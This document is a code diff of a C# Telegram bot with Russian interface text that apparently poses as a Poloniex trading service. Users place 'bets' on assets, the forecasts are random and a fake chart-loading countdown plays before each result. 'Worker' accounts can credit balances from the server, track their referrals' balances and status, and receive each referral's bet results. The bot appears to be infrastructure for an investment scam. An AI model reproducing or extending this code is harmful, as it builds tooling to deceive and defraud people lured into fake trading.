-                    new[] { InlineKeyboardButton.WithCallbackData($"RUB {GetForecast()}", "betRUB"), InlineKeyboardButton.WithCallbackData($"KZT {GetForecast()}", "betKZT") },
-                    new[] { InlineKeyboardButton.WithCallbackData($"UAN {GetForecast()}", "betUAN"), InlineKeyboardButton.WithCallbackData($"PLN {GetForecast()}", "betPLN") },
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", "createECNAccount") }
+                    new[] { InlineKeyboardButton.WithCallbackData($"USD {GetForecast()}", $"{user.Id}betUSD"), InlineKeyboardButton.WithCallbackData($"EUR {GetForecast()}", $"{user.Id}betEUR") },
+                    new[] { InlineKeyboardButton.WithCallbackData($"RUB {GetForecast()}", $"{user.Id}betRUB"), InlineKeyboardButton.WithCallbackData($"KZT {GetForecast()}", $"{user.Id}betKZT") },
+                    new[] { InlineKeyboardButton.WithCallbackData($"UAN {GetForecast()}", $"{user.Id}betUAN"), InlineKeyboardButton.WithCallbackData($"PLN {GetForecast()}", $"{user.Id}betPLN") },
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount") }
                      });
                 }
                 else if (type[6..] == "Crypto")
                 {
                     inlineKeyboard = new(new[]{
-                    new[] { InlineKeyboardButton.WithCallbackData($"BTC {GetForecast()}", "betBTC"), InlineKeyboardButton.WithCallbackData($"MIOTA {GetForecast()}", "betMIOTA"), InlineKeyboardButton.WithCallbackData($"NEO {GetForecast()}", "betNEO") },
-                    new[] { InlineKeyboardButton.WithCallbackData($"BCH {GetForecast()}", "betBCH"), InlineKeyboardButton.WithCallbackData($"XRP {GetForecast()}", "betXRP"), InlineKeyboardButton.WithCallbackData($"XEM {GetForecast()}", "betXEM") },
-                    new[] { InlineKeyboardButton.WithCallbackData($"DASH {GetForecast()}", "betDASH"), InlineKeyboardButton.WithCallbackData($"DOGE {GetForecast()}", "betDOGE"), InlineKeyboardButton.WithCallbackData($"ETH {GetForecast()}", "betETH") },
-                    new[] { InlineKeyboardButton.WithCallbackData($"LTC {GetForecast()}", "betLTC"), InlineKeyboardButton.WithCallbackData($"XMR {GetForecast()}", "betXMR"), InlineKeyboardButton.WithCallbackData($"ETC {GetForecast()}", "betETC") },
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", "createECNAccount") }
+                    new[] { InlineKeyboardButton.WithCallbackData($"BTC {GetForecast()}", $"{user.Id}betBTC"), InlineKeyboardButton.WithCallbackData($"MIOTA {GetForecast()}", $"{user.Id}betMIOTA"), InlineKeyboardButton.WithCallbackData($"NEO {GetForecast()}", $"{user.Id}betNEO") },
+                    new[] { InlineKeyboardButton.WithCallbackData($"BCH {GetForecast()}", $"{user.Id}betBCH"), InlineKeyboardButton.WithCallbackData($"XRP {GetForecast()}", $"{user.Id}betXRP"), InlineKeyboardButton.WithCallbackData($"XEM {GetForecast()}", $"{user.Id}betXEM") },
+                    new[] { InlineKeyboardButton.WithCallbackData($"DASH {GetForecast()}", $"{user.Id}betDASH"), InlineKeyboardButton.WithCallbackData($"DOGE {GetForecast()}", $"{user.Id}betDOGE"), InlineKeyboardButton.WithCallbackData($"ETH {GetForecast()}", $"{user.Id}betETH") },
+                    new[] { InlineKeyboardButton.WithCallbackData($"LTC {GetForecast()}", $"{user.Id}betLTC"), InlineKeyboardButton.WithCallbackData($"XMR {GetForecast()}", $"{user.Id}betXMR"), InlineKeyboardButton.WithCallbackData($"ETC {GetForecast()}", $"{user.Id}betETC") },
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount") }
                      });
                 }        
                 else if (type[6..] == "Equity")
                 {
                     inlineKeyboard = new(new[]
                     {
-                        new[] { InlineKeyboardButton.WithCallbackData($"GOOG {GetForecast()}", "betGOOG"), InlineKeyboardButton.WithCallbackData($"AMZN {GetForecast()}", "betAMZN"), InlineKeyboardButton.WithCallbackData($"SBER {GetForecast()}", "betSBER") },
-                        new[] { InlineKeyboardButton.WithCallbackData($"NKE {GetForecast()}", "betNKE"), InlineKeyboardButton.WithCallbackData($"BRK.A {GetForecast()}", "betBRK.A"), InlineKeyboardButton.WithCallbackData($"BA {GetForecast()}", "betBA") },
-                        new[] { InlineKeyboardButton.WithCallbackData($"TSLA {GetForecast()}", "betTSLA") },
-                        new[] { InlineKeyboardButton.WithCallbackData($"KO {GetForecast()}", "betKO"), InlineKeyboardButton.WithCallbackData($"INTC {GetForecast()}", "betINTC"), InlineKeyboardButton.WithCallbackData($"MA {GetForecast()}", "betMA") },
-                        new[] { InlineKeyboardButton.WithCallbackData($"MCD {GetForecast()}", "betMCD"), InlineKeyboardButton.WithCallbackData($"META {GetForecast()}", "betMETA"), InlineKeyboardButton.WithCallbackData($"MSFT {GetForecast()}", "betMSFT") },
-                        new[] { InlineKeyboardButton.WithCallbackData($"AAPL {GetForecast()}", "betAAPL") },
-                        new[] { InlineKeyboardButton.WithCallbackData($"NFLX {GetForecast()}", "betNFLX"), InlineKeyboardButton.WithCallbackData($"NVDA {GetForecast()}", "betNVDA"), InlineKeyboardButton.WithCallbackData($"PEP {GetForecast()}", "betPEP") },
-                        new[] { InlineKeyboardButton.WithCallbackData($"PFE {GetForecast()}", "betPFE"), InlineKeyboardButton.WithCallbackData($"VISA {GetForecast()}", "betVISA"), InlineKeyboardButton.WithCallbackData($"SBUX {GetForecast()}", "betSBUX") },
-                        new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", "createECNAccount") }
+                        new[] { InlineKeyboardButton.WithCallbackData($"GOOG {GetForecast()}", $"{user.Id}betGOOG"), InlineKeyboardButton.WithCallbackData($"AMZN {GetForecast()}", $"{user.Id}betAMZN"), InlineKeyboardButton.WithCallbackData($"SBER {GetForecast()}", $"{user.Id}betSBER") },
+                        new[] { InlineKeyboardButton.WithCallbackData($"NKE {GetForecast()}", $"{user.Id}betNKE"), InlineKeyboardButton.WithCallbackData($"BRK.A {GetForecast()}", $"{user.Id}betBRK.A"), InlineKeyboardButton.WithCallbackData($"BA {GetForecast()}", $"{user.Id}betBA") },
+                        new[] { InlineKeyboardButton.WithCallbackData($"TSLA {GetForecast()}", $"{user.Id}betTSLA") },
+                        new[] { InlineKeyboardButton.WithCallbackData($"KO {GetForecast()}", $"{user.Id}betKO"), InlineKeyboardButton.WithCallbackData($"INTC {GetForecast()}", $"{user.Id}betINTC"), InlineKeyboardButton.WithCallbackData($"MA {GetForecast()}", $"{user.Id}betMA") },
+                        new[] { InlineKeyboardButton.WithCallbackData($"MCD {GetForecast()}", $"{user.Id}betMCD"), InlineKeyboardButton.WithCallbackData($"META {GetForecast()}", $"{user.Id}betMETA"), InlineKeyboardButton.WithCallbackData($"MSFT {GetForecast()}", $"{user.Id}betMSFT") },
+                        new[] { InlineKeyboardButton.WithCallbackData($"AAPL {GetForecast()}", $"{user.Id}betAAPL") },
+                        new[] { InlineKeyboardButton.WithCallbackData($"NFLX {GetForecast()}", $"{user.Id}betNFLX"), InlineKeyboardButton.WithCallbackData($"NVDA {GetForecast()}", $"{user.Id}betNVDA"), InlineKeyboardButton.WithCallbackData($"PEP {GetForecast()}", $"{user.Id}betPEP") },
+                        new[] { InlineKeyboardButton.WithCallbackData($"PFE {GetForecast()}", $"{user.Id}betPFE"), InlineKeyboardButton.WithCallbackData($"VISA {GetForecast()}", $"{user.Id}betVISA"), InlineKeyboardButton.WithCallbackData($"SBUX {GetForecast()}", $"{user.Id}betSBUX") },
+                        new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount") }
                     });
                 }
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: "🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыберите актив.",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, "🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыберите актив.", inlineKeyboard);
             }
             else if (type == "techSupport")
             {
                 InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
+                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
             });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: "<b>Заметили <u>ошибку</u>, есть <u>проблема</u>, <u>вопрос</u>?</b>\nСкорей пиши в нашу службу поддержки!\n\n<b>Не забывай соблюдать правила культурного общения</b>\n<i>Общайся вежливо, не спамь, не флуди, не перебивай.</i>\n\n‼️ За оффтоп можно получить от мута до бана.\n\n💻 Техническая поддержка: @Poloniexx_support",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, "<b>Заметили <u>ошибку</u>, есть <u>проблема</u>, <u>вопрос</u>?</b>\nСкорей пиши в нашу службу поддержки!\n\n<b>Не забывай соблюдать правила культурного общения</b>\n<i>Общайся вежливо, не спамь, не флуди, не перебивай.</i>\n\n‼️ За оффтоп можно получить от мута до бана.\n\n💻 Техническая поддержка: @Poloniexx_support", inlineKeyboard);
             }
             else if(type == "workerAdminPanel" && user.IsWorker)
             {
                 InlineKeyboardMarkup inlineKeyboard = new(new[]
                 {                    
-                    new[] { InlineKeyboardButton.WithCallbackData("💼 Меню работника", "workerMenu") },
-                    new[] { InlineKeyboardButton.WithCallbackData("🗂 Меню админа", "adminMenu") },
-                    new[] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
+                    new[] { InlineKeyboardButton.WithCallbackData("💼 Меню работника", $"{user.Id}workerMenu") },
+                    new[] { InlineKeyboardButton.WithCallbackData("🗂 Меню админа", $"{user.Id}adminMenu") },
+                    new[] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                 });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: "Выберите меню:",
-                    replyMarkup: inlineKeyboard,
-                    parseMode: ParseMode.Html,
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, "Выберите функцию", inlineKeyboard);
             }
             else if(type == "workerMenu" && user.IsWorker)
             {
                 InlineKeyboardMarkup inlineKeyboard = new(new[]
                 {
-                    new[] { InlineKeyboardButton.WithCallbackData("Пополнить баланс от сервера", "addBalanceFromServer"), InlineKeyboardButton.WithCallbackData("Сообщение от бота", "messageFromBot") },
-                    new[] { InlineKeyboardButton.WithCallbackData("Управление рефералами", "controlRefferals") },
-                    new[] { InlineKeyboardButton.WithCallbackData("Дополнительная информация", "additionalInfoRefferals") ,InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору меню", "workerAdminPanel") }
+                    new[] { InlineKeyboardButton.WithCallbackData("Пополнить баланс от сервера", $"{user.Id}addBalanceFromServer"), InlineKeyboardButton.WithCallbackData("Сообщение от бота", $"{user.Id}messageFromBot") },
+                    new[] { InlineKeyboardButton.WithCallbackData("Управление рефералами", $"{user.Id}controlRefferals") },
+                    new[] { InlineKeyboardButton.WithCallbackData("Дополнительная информация", $"{user.Id}additionalInfoRefferals") ,InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору меню", $"{user.Id}workerAdminPanel") }
                 });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: "Выберите функцию",
-                    replyMarkup: inlineKeyboard,                    
-                    cancellationToken: cancellationToken);
+                SendMessageWithButtons(user, cancellationToken, "Выберите функцию", inlineKeyboard);
             }
             else if(type == "controlRefferals" && user.IsWorker)
             {
                 InlineKeyboardMarkup inlineKeyboard = new(new[]
                 {
-                    new[] { InlineKeyboardButton.WithCallbackData("Вернутся в меню работника", "workerMenu") },
+                    new[] { InlineKeyboardButton.WithCallbackData("Вернутся в меню работника", $"{user.Id}workerMenu") },
                 });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: $"Ваши рефералы:\n\nТут рефералы\n\nВведите username или TgID, что-бы выбрать пользователя.\n(Можно скопировать нажатием)",
-                    replyMarkup: inlineKeyboard,
-                    cancellationToken: cancellationToken);
+                string refferals = "\n";
+                if(user.Refferals.Count > 0)
+                {
+                    foreach (var reffId in user.Refferals)
+                    {
+                        var reff = USER(reffId);
+                        refferals += $"<code>@{reff.Username}</code>, {reff.Balance} ₽, {reff.Status}, TgID: <code>{reff.Id}</code>\n";
+                    }                        
+                }
+                if (refferals == "\n") refferals = "\nУ вас ещё нет рефералов\n";
+
+                SendMessageWithButtons(user, cancellationToken, $"Ваши рефералы:\n{refferals}\nВведите username или TgID, что-бы выбрать пользователя.\n(Можно скопировать нажатием)", inlineKeyboard);
             }
             else if(type == "additionalInfoRefferals" && user.IsWorker)
             {
                 InlineKeyboardMarkup inlineKeyboard = new(new[]
                 {
-                    new [] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в меню работника", "workerMenu") }
+                    new [] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в меню работника", $"{user.Id}workerMenu") }
                 });
 
-                idMessage = await botClient.EditMessageTextAsync(
-                    chatId: idMessage.Chat.Id,
-                    messageId: idMessage.MessageId,
-                    text: $"Реферальная ссылка:\n<code>https://t.me/poloniexruBot?start={user.Id}</code>",
+                SendMessageWithButtons(user, cancellationToken, $"Реферальная ссылка:\n<code>https://t.me/poloniexruBot?start={user.Id}</code>", inlineKeyboard);
+            }
+            else if(type == "addBalanceFromServer")
+            {
+                // ДОДЕЛАТЬ КОД
+            }
+        }
+    }
+
+    async void SendMessage(UserData user, CancellationToken cancellationToken, string text)
+    {
+        try { await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId); } catch { }
+        user.idMessage = await botClient.SendTextMessageAsync(
+                    chatId: user.idMessage.Chat.Id,
+                    text: text,
+                    parseMode: ParseMode.Html,
+                    cancellationToken: cancellationToken);
+    }
+
+    async void SendMessageWithButtons(UserData user, CancellationToken cancellationToken, string text, InlineKeyboardMarkup inlineKeyboard)
+    {
+        try { await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId); } catch { }
+        user.idMessage = await botClient.SendTextMessageAsync(
+                    chatId: user.idMessage.Chat.Id,
+                    text: text,
                     replyMarkup: inlineKeyboard,
                     parseMode: ParseMode.Html,
                     cancellationToken: cancellationToken);
-            }
-        }
     }
 
     async void UpdateMessageBet(CancellationToken cancellationToken, UserData user)
     {
         for (int i = 15; i >= 1; i--)
         {
-            idMessage = await botClient.EditMessageTextAsync(
-            chatId: idMessage.Chat.Id,
-            messageId: idMessage.MessageId,
+            user.idMessage = await botClient.EditMessageTextAsync(
+            chatId: user.idMessage.Chat.Id,
+            messageId: user.idMessage.MessageId,
             text: $"Получение данных о графике: {i} секунд",
             cancellationToken: cancellationToken);
 
@@ -680,21 +622,31 @@ class TGBot
         else courseChanged = betClosed ? user.CourseDirection : "Вверх ⬆";
 
         InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", "loadMenu") }
+                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
             });
 
-        idMessage = await botClient.EditMessageTextAsync(
-            chatId: idMessage.Chat.Id,
-            messageId: idMessage.MessageId,
-            text: $"Имя пользователя: <i>@{user.Username}</i>\nTelegramID: <i>{user.Id}</i>\n\nИнвестиция в актив: <i>{user.SelectedAsset}</i>\nСумма инвестиции: <i>{user.InvestmentAmount} ₽</i>\nПрогноз пользователя: <i>{user.CourseDirection}</i>\nПроцент при успешном прогнозе: <i><u>180%</u></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nИзменения актива: {user.SelectedAsset}\n\nКурс изменился: {courseChanged}\n{(betClosed ? "Прибыль" : "Убыток")} составляет: {(betClosed ? user.InvestmentAmount * 0.8 : user.InvestmentAmount)}\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🗓 {DateTime.Now.ToShortDateString()}, {DateTime.Now.ToLongTimeString()}",
-            replyMarkup: inlineKeyboard,
-            parseMode: ParseMode.Html,
-            cancellationToken: cancellationToken);
+        SendMessageWithButtons(user, cancellationToken, $"Имя пользователя: <i>@{user.Username}</i>\nTelegramID: <i>{user.Id}</i>\n\nИнвестиция в актив: <i>{user.SelectedAsset}</i>\nСумма инвестиции: <i>{user.InvestmentAmount} ₽</i>\nПрогноз пользователя: <i>{user.CourseDirection}</i>\nПроцент при успешном прогнозе: <i><u>180%</u></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nИзменения актива: {user.SelectedAsset}\n\nКурс изменился: {courseChanged}\n{(betClosed ? "Прибыль" : "Убыток")} составляет: {(betClosed ? user.InvestmentAmount * 0.8 : user.InvestmentAmount)}\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🗓 {DateTime.Now.ToShortDateString()}, {DateTime.Now.ToLongTimeString()}", inlineKeyboard);
+
+        var yourRefferals = FindRefferals(user);
+        if(yourRefferals.Count > 0) // РАССЫЛКА ВСЕМ РЕФЕРАЛАМ
+            foreach(var reff in yourRefferals)
+                if (reff.idMessage != null && reff != user)
+                    SendMessage(user, cancellationToken, $"Имя пользователя: <i>@{user.Username}</i>\nTelegramID: <i>{user.Id}</i>\n\nИнвестиция в актив: <i>{user.SelectedAsset}</i>\nСумма инвестиции: <i>{user.InvestmentAmount} ₽</i>\nПрогноз пользователя: <i>{user.CourseDirection}</i>\nПроцент при успешном прогнозе: <i><u>180%</u></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nИзменения актива: {user.SelectedAsset}\n\nКурс изменился: {courseChanged}\n{(betClosed ? "Прибыль" : "Убыток")} составляет: {(betClosed ? user.InvestmentAmount * 0.8 : user.InvestmentAmount)}\nБаланс реферала: {user.Balance}\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🗓 {DateTime.Now.ToShortDateString()}, {DateTime.Now.ToLongTimeString()}");
 
         user.InvestmentAmount = 0;
         user.SelectedAsset = string.Empty;
 
         SaveData();
+    }
+
+    List<UserData> FindRefferals(UserData user)
+    {
+        List<UserData> result = new List<UserData>();
+
+        foreach(var reff in users)
+            if (reff.Refferals.Contains(user.Id) && reff != user) result.Add(reff);
+
+        return result;
     }
 
     string GetForecast()
